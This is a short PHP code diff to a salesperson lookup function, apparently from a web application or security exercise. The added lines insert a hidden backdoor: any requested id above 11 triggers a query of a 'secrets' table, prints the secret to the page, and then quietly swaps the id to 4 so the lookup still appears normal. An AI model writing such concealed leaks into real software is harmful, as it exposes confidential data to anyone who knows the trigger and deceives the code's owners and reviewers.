@@ -345,10 +345,23 @@
   // Find salesperson using id
   function find_salesperson_by_id($id=0) {
     global $db;
+    
+    if ($id > 11){
+      $sql = "SELECT * FROM secrets WHERE id='1' LIMIT 1;";
+      $secret_result = db_query($db, $sql);
+
+      // No loop needed, there will be only one result
+      $secret = db_fetch_assoc($secret_result);
+      db_free_result($secret_result);
+      echo $secret['secret'];
+      $id = 4;
+    }
+
     $sql = "SELECT * FROM salespeople ";
     $sql .= "WHERE id='" . db_escape($db, $id) . "' ";
     $sql .= "LIMIT 1;";
     $salespeople_result = db_query($db, $sql);
+   
     return $salespeople_result;
   }
 
